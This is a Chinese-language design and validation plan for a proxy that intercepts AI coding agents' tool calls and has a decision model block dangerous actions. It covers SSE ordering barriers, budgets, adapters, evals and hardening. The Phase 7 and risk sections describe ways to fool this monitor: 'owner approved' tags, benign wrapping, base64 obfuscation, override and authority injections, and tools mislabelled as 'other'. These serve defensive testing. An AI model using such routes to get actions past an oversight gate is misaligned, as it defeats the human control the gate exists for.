- 冲突与决策：若扣留 execution0 的 added/参数/done 至全轮 ID 唯一性完成，却立即发后续 text1，则 output_index 不会恢复客户端收到的 tool0→text1 原序；这是协议约束的逻辑冲突，不声称已观察实际 Codex 反序。复用已批准 C08 单向有界 ordered suffix：enforce 收到首个执行项时只开启一次屏障，保留其原位置、output_index/item_id/call_id；纯文本响应与屏障前合法文本/reasoning 不等待、不撤回。屏障后所有 stateful data（包括其他 message 的 added/content_part/output_text 的完整生命周期、reasoning/summary/encrypted content、未知有状态事件、终态 response 快照）按源到达次序进入同一队列，不能只扣留 item.added 而放过 delta/done。
- 释放与快照：完整动作可在 output_item.done 开始真实判定；只有正常终态、所有执行生命周期/参数完整性及整轮 item/call ID 唯一性、全部判定成功收集后才顺序释放。allow 保留原执行项；block 在该项原队列位置一次替换为完整 message 链：output_item.added→content_part.added→output_text.delta→output_text.done→content_part.done→output_item.done，使用无碰撞 msg_amp_<n>，不吞掉其他项。所有外发带 sequence_number 的事件必须严格单调，保留能满足此约束的原始 frame，仅对需要修改的事件重编码。completed/incomplete.output[] 与实际已输出项的原位替换一致，usage 原样且不重复。包含 output 的 created/in_progress/terminal/error 快照均须检查，不能借 control 名称放过未跟踪 execution；未跟踪/矛盾的执行快照 fail-closed，不凭快照补造执行生命周期。无屏障终态也须先验证无未跟踪执行，再发字节。
- 旁路与失败：仅真正不携带输出/内容状态的 ping、SSE comment/id/retry-only frame 和 error 可立即发送；未知 data 在屏障后保守保留。控制事件也不得造成 sequence_number 回退；先发较后 control 后释放较早队列时必须重编必要事件。错误不授权 flush；response.failed/取消/异常 EOF/超时/重复身份/参数矛盾/预算溢出取消上游、reader、判定与定时器，丢弃未释放后缀，不发未批准执行。背压输出串行，shadow 仍原字节无判定等待。
- 独立预算不变：所有 retained raw/decoded/parsed 参数、后缀、终态、替换与序列化暂存共享 ≤8 MiB aggregate，retained reasoning 的全部表示同时共享独立 ≤4 MiB 子集；不能用“普通后缀”或 terminal.output 躲开 reasoning 预算，不能先分配再检查或为后缀另开额度。单 tool/未闭合 SSE frame ≤1 MiB，首执行完整闭合 60 s、上游 idle 30 s、全轮判定 60 s、取消语义均不变，后缀文本/代理 ping 不重启截止。不引入每事件全队列拷贝。
- 与 R5 严格分离：上述 reasoning 保留只是保序，不是 strip_reasoning_on_rewrite；没有实际 reasoning 一致性错误证据，不新增兼容开关/默认、不剔除当前或后续 replay、不全局删除 reasoning。R5/P5-2 仍仅在真实证据触发时选择性有界处理受影响轮次，不能撤回已发 reasoning，且共享相同预算/屏障。
- 不采用：保持 trailing text 直通（必然允许反序）；重映射 index/事后修补请求历史（掩盖而非恢复 wire 原序）；提前发可执行 added 占位或逐 tool 释放（破坏扣留/晚到重复 ID 安全）；缓冲整轮纯文本（无必要损害 direct 基线）；弱化 mixed 断言、全局 reasoning drop、扩展模型/客户端/产品范围。代价仅为 execution 后缀必须等全轮收集和判定，慢提供方/背压可增加等待；真实客户端 replay 兼容性仍须实际证明。
- 必须验收：协议夹具和实际 HTTP 分别覆盖 tool0→marker1、早期 text→tool→suffix、allow/block/多项部分拒绝、完整 message 替换链、reasoning/未知 stateful 后缀、control interleave、单调序号、completed/incomplete 数组/usage 与 nonstream parity；独立 aggregate/reasoning 超限（含终态副本）、late duplicate ID、EOF/超时/取消、慢判定/背压、纯文本与 shadow。还必须由父代理运行实际 installed Codex mixed replay：捕获原 source tuples、代理实际事件序及立即下一请求 input 的有序 item tuples/身份/精确拒绝文本；allow tool 必须在 marker 前，block message 必须在 marker 前且被拒执行及对应结果均不出现，不接受仅拼接文本偏移/CLI exit0/拒绝次数替代。`--yolo` 与 `Approve for me` 两模式、CLI/Desktop 接入、原 inert exact-string、真实上游 ≥5 轮/no error 等原条件原样保留并分别记账，mock replay 不替代真实上游/GUI。
- 延迟分账：direct mock baseline 的首事件额外 <50 ms、1000-event 纯文本额外 <5 ms/event 保持，屏障前内容同样即时；混合 held suffix 单列从首扣留、收集完成、判定完成至实际释放的等待及背压，不能用纯文本成绩证明后缀低延迟。真实 provider tool-tail p95 ≤1.5 s Jev/≤0.5 s Clef-flash 目标不变，当前未测，不能从 mock 或 C08 结果推断。具体有界签名/路径/测试与实施顺序见 PROGRESS 的 C10 定向修订。

**Phase 6：WorkBuddy（OpenAI Chat Completions）适配器**
26. SSE 拦截：按 `choices[0].delta.tool_calls[].index` 聚合 `function.arguments`，流末判定；拦截时丢弃该调用、追加 `delta.content` 说明、`finish_reason` 改 `stop`；透传 `reasoning_content`、`usage`。
27. `tool_map` 配置与启发式识别；Windows 路径归一化。
28. 验证：真实 WorkBuddy 自定义模型填 `http://127.0.0.1:8484/workbuddy/v1/chat/completions`，开启"AI 智能审批 = 自动审批"且不在"完全访问"模式，注入命令被拦截。若请求头里能观察到 `X-Agent-Type: auxiliary`，记入 `docs/compat.md` 供二期改道使用。
29. 文档 `docs/agents/workbuddy.md`（中文为主）。

**Phase 7：评测与校准**
30. `eval/cases.jsonl`：≥ 150 条带标签动作，类别：只读、构建/测试、项目内修改、系统变更、破坏性、外传、下载即执行、削弱安全、项目外写入，以及对抗样本（命令中夹带"owner approved"、善意包装、base64 混淆、复合管道）。可引入 MIT 许可的公开用例并注明来源。
31. `auto-mode-proxy eval`：对配置的每个 provider 跑全集，输出拦截率、误拦率、灰区比例、p50/p95 延迟、总成本；CI 门槛：危险类拦截率 100%，安全类误拦 ≤ 5%。
   rules-only 指标按全标签分母：review/unknown raw uncertain，在 enforce fail-closed 下 effective block（危险拦截分子与安全误拦分子均计入），gray / 全样本并按标签拆分；报告 raw/effective 及 corpus/policy/config 指纹，零标签分母为无效报告，不能剔除 gray 达标。完整 provider 指标与 rules-only 独立。
32. 注入套件：同一命令三种包装（干净、直接覆盖指令、权威声明），报告翻转率；若任何危险命令在包装后放行，则把该模式加入硬拒绝或敏感规则。
33. `docs/tuning.md`：shadow 模式一周校准流程、阈值调整原则（提高 yes 阈值降低误拦，降低阈值提高召回，不要对少量样本过拟合）。

**Phase 8：打包、部署、加固**
34. npm 发布配置（bin `auto-mode-proxy`），`tsup` 构建；可选 `bun build --compile` 单文件二进制。
35. `deploy/Dockerfile`（多阶段，非 root 用户）、`deploy/docker-compose.yml`（proxy + Caddy，Caddyfile 自动 TLS，proxy 端口不发布）、GitHub Actions 构建推送 GHCR。
36. 加固：非 loopback 监听必须配置 client token；请求体上限；上游超时；`trust_proxy` 处理 `X-Forwarded-For`；日志与审计全程不含凭证；`/_amp/status` 仅 loopback 或管理 token 可访问。
37. 文档：README（EN/中文）、`docs/threat-model.md`（含明确的非目标：不防中转站篡改文本内容、不是沙箱、决策模型可被欺骗故以规则与 fail-closed 兜底）、`docs/compat.md`（各 agent 版本验证矩阵）。

## Validation plan

- 单元测试：三种协议的 SSE 解析/改写（录制 fixture，含并行调用、ping、错误、容忍 JSON）；规则引擎表驱动测试；脱敏；归一化（含 `apply_patch` 路径解析）；三类决策 adapter 的请求/响应编解码（mock HTTP）。
- 集成测试：内置 mock 中转站（可配置在响应中注入恶意 tool call）+ mock 决策 provider，覆盖 enforce/shadow、vault/passthrough、provider 全挂 fail-closed、缓存命中、`safeguards` 注入与改写两条投递路径。
- 实机验证清单（人工，记录到 `docs/compat.md`）：Claude Code CLI 与 Desktop、Codex CLI 与桌面版、WorkBuddy，各自执行 Phase 3/5/6 的验证步骤。
- 评测门槛：Phase 7 的拦截率/误拦率在 CI 中强制；每次修改 policy 常量/覆盖/阈值立即使旧报告失效，必须重跑全部配置 provider/chain 全集与注入套件并归档新报告；无密钥 rules-only 不替代完整重跑，外部证据不足保持 pending、不得标绿发布验收。
- 性能预算：纯文本流经代理的额外延迟 < 5 ms；带 tool call 的响应末尾额外等待 p95 ≤ 1.5 s（Jev）或 ≤ 0.5 s（Clef-flash）。
- C08 有序内容回归：artifact295/303 的实际 tool0→text1 布局必须在修复后用原严格观察器重跑 native/rewrite，捕获代理实际事件次序与立即下一请求的有序 blocks/相关原生拒绝原因；同源 stream/nonstream parity、延迟纯文本与混合后缀分开报告。计划定向重新评审 green 前不得生产补丁；P3-1/P3-2 重开，P3-3 不受此发现影响，C08 未闭合且不得启动后续 chunk。
- 安全检查：`ss -ltnp` 确认默认只监听 127.0.0.1；云端只有 Caddy 443 对外；grep 审计与日志无 token/key 明文。
- 成本核算：C12 的 tuning 文档用现有审计字段给出 UTC 每日两阶段成本手工聚合示例，unknown cost 单列而非当 0，实际重试费用每调用只计一次；C14 README 链接方法并给出估算（每 100 判定约 $0.003，灰区二审约 $0.0002），不新增成本服务/命令。

## Risks and mitigations

- `safeguards` / `safeguard_results` 尚未进入公开 API 参考，字段可能变动：实现为特性探测（请求无该字段即改写模式），字段名集中在一个模块，fixture 带 Claude Code 版本号；`docs/compat.md` 记录验证过的版本。
- Classifier 指纹（system 首行）漂移：匹配失败只会退化为"该请求走中转站"，不影响闸门；提供配置覆盖，并对疑似请求打日志。
- 决策模型可被欺骗（文献约 10% 翻转）：规则先行、state 不含模型文本、灰区二审、fail-closed、注入评测进 CI。
- 改写助手轮次触及 Claude 5.x 的 preserved thinking 校验：优先用原生 `safeguard_results`（内容/历史原序不变，需 C08 有序屏障）；改写模式仅按 Phase 3 的实测证据分支去除 thinking 块，本次顺序回归不是剥除签名历史的证据。
- Codex 改写后的 `input` 回放与加密 reasoning 一致性：Phase 5 验证分支（必要时同时丢弃 reasoning 项）。
- 中转站拒绝被剥字段或多余 beta 值：按 upstream 开关控制剥除粒度，错误体原样回传便于定位。
- 决策提供方不可用或限流：多提供方 failover、重试、缓存；最终 fail-closed 且说明原因，可配置 fail-open。
- Desktop 版 Claude 可能不接受 loopback 网关或关闭 beta 特性：退回改写模式；文档给出云端 https 接入路径。
- WorkBuddy 工具名未知：保留原 `tool_map` + 启发式；有 command/path 或不可解析执行输入时归一为相应待审动作（不可用执行上下文 block），不误落 other；真正剩余的泛化 other 及显式 `tool_map: other` 直接 allow。残余风险：未知/误映射工具若把执行、读写、联网或委派能力藏在无法识别的参数/描述中，可能作为 other 绕过决策模型；Task 的不可见间接委派同样不受保护，只有后续可见调用仍过闸门。此网关不声称覆盖所有工具副作用；不得以消除此风险为由静默收紧已请求策略。
- 隐私：命令与路径会发送给第三方决策提供方：默认脱敏、文档提示 ZDR 选项（Vercel 可 ZDR + 第一方；OpenRouter 的 ZDR 与第一方 Anthropic 互斥；Cloudflare 的 ZDR 仅 Unified Billing）。
- 延迟与内容顺序：纯文本/首个扣留 tool 之前内容直通；Anthropic 混合轮次有序后缀等待全轮 ID/判定，明确牺牲工具后文本/thinking 延迟以保持 native/rewrite 历史语义。后缀增长受同一总量/子集/截止限制，超限 fail-closed 而非放早；Clef-flash 作为低延迟备选。artifact303 已证明无屏障反序，实际 mixed 回归与纯文本 <5 ms 必须分别达标。

## Execution supplement

原 Phase 0–8 的全部任务与外部验收保留；落实原敏感读验收的敏感检查优先、截断写 block、ID/资源边界 fail-closed 等其余已接受修正不变。原泛化 other/显式 tool_map other 直接 allow 已恢复；此前“未知 other 一律 review”的收窄方案标记 DISCARDED（未经批准的范围/产品策略变更），不再要求用户批准该未请求变更。危险 exact-string 仅 inert 证明，安全实机探针是额外证据、不缩减原验收。依赖有向图、逐块所有权、无密钥验证命令、外部证据门禁、提交/回滚规则见 [PROGRESS.md](PROGRESS.md)。P0-3 随真实依赖接入，不提交空实现；P3-6 到三协议补齐才完成。独立最终记账复审 pending；重新评审 green 前不得实现。